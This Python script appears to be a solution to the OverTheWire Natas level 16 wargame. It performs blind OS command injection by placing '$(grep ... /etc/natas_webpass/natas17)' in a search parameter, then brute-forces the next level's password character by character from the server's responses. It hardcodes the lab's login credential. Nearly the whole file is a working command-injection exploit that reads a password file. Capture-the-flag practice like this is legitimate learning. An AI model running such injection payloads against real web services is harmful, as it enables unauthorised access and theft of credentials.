#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Mar  8 22:55:36 2021

@author: rohit
"""

import requests

url = "http://natas16.natas.labs.overthewire.org/?needle="
session = requests.Session()
some=requests.get(url,auth=requests.auth.HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')).text
print("Some :",some)
pass1='unrecognized$(grep {0} /etc/natas_webpass/natas17)&submit=search'
session = requests.Session()
some=requests.get(url,auth=requests.auth.HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')).text
print("Some :",some)
success = requests.get(url+"unrecognized",auth=requests.auth.HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')).text
print("Success :",success)
charset=""
for i in range(48,128):
    load = pass1.format(chr(i))
    response = requests.get(url+load,auth=requests.auth.HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
    if ("unrecognized" not in response.text and chr(i) not in (";|&`#()*.^$\'"+'"')):
        charset += chr(i)
        print("Charset :",charset)
password=""
for i in range(32):
    for j in charset:
        load=pass1.format(password+j)
        response = requests.get(url+load,auth=requests.auth.HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
        if ("unrecognized" not in response.text):
            password +=j
            print("Password :",password)
            break
while(len(password)!=32):
    for j in charset:
        load=pass1.format(j+password)
        response = requests.get(url+load,auth=requests.auth.HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
        if ("unrecognized" not in response.text):
            password = j + password
            print("Password :",password)
            break
print("Password :",password)